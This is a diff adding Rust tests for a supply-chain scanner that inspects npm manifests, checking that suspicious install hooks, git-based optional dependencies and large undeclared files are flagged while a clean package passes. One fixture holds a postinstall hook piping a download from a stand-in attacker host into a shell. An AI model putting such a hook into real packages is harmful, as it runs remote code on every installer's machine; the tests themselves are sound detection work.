@@ -94,6 +94,95 @@ fn analyze_malicious_js_blocks() {
 }
 
 #[test]
+fn analyze_npm_manifest_metadata_heuristics_fire() {
+    // The metadata detectors (install-hook, optional-git-dep, vcs-dep) read the
+    // package.json the analyze pipeline now parses — not source files. A clean
+    // index.js next to a malicious manifest must still BLOCK.
+    let d = tmp("manifest");
+    write(&d, "index.js", "module.exports = 1;\n");
+    write(
+        &d,
+        "package.json",
+        r#"{
+          "name": "evilpkg",
+          "version": "1.0.0",
+          "scripts": { "postinstall": "curl -sSL http://attacker.example/p | sh" },
+          "optionalDependencies": { "x": "github:evil/x#aabbcc1122334455667788990011223344556677" }
+        }"#,
+    );
+    let out = run(&[
+        "analyze",
+        d.to_str().unwrap(),
+        "--ecosystem",
+        "npm",
+        "--json",
+    ]);
+    assert_eq!(out.code, 0);
+    assert!(
+        out.stdout.contains("\"verdict\": \"block\""),
+        "{}",
+        out.stdout
+    );
+    assert!(
+        out.stdout.contains("install-hook-suspicious"),
+        "{}",
+        out.stdout
+    );
+    assert!(out.stdout.contains("git-dep-in-optional"), "{}", out.stdout);
+    let _ = std::fs::remove_dir_all(&d);
+}
+
+#[test]
+fn analyze_unlisted_large_file_flagged() {
+    // A large undeclared JS file (not in package.json "files") is a smuggled
+    // payload shape — exercises the manifest `files` allowlist parsing.
+    let d = tmp("unlisted");
+    write(
+        &d,
+        "package.json",
+        r#"{"name":"big","version":"1.0.0","files":["dist"]}"#,
+    );
+    std::fs::write(d.join("payload.js"), "a".repeat(600_000)).unwrap();
+    let out = run(&[
+        "analyze",
+        d.to_str().unwrap(),
+        "--ecosystem",
+        "npm",
+        "--json",
+    ]);
+    assert_eq!(out.code, 0);
+    assert!(out.stdout.contains("unlisted-large-file"), "{}", out.stdout);
+    let _ = std::fs::remove_dir_all(&d);
+}
+
+#[test]
+fn analyze_clean_npm_package_is_safe() {
+    // A legit manifest (node-gyp rebuild hook, registry dep) must NOT trip the
+    // metadata detectors — guards against false positives from the wiring.
+    let d = tmp("cleannpm");
+    write(&d, "index.js", "module.exports = 1;\n");
+    write(
+        &d,
+        "package.json",
+        r#"{"name":"clean","version":"1.0.0","scripts":{"postinstall":"node-gyp rebuild"},"dependencies":{"lodash":"^4.17.21"}}"#,
+    );
+    let out = run(&[
+        "analyze",
+        d.to_str().unwrap(),
+        "--ecosystem",
+        "npm",
+        "--json",
+    ]);
+    assert_eq!(out.code, 0);
+    assert!(
+        out.stdout.contains("\"verdict\": \"safe\""),
+        "{}",
+        out.stdout
+    );
+    let _ = std::fs::remove_dir_all(&d);
+}
+
+#[test]
 fn analyze_clean_code_is_safe() {
     let d = tmp("clean");
     write(&d, "index.js", "export const add = (a, b) => a + b;\n");
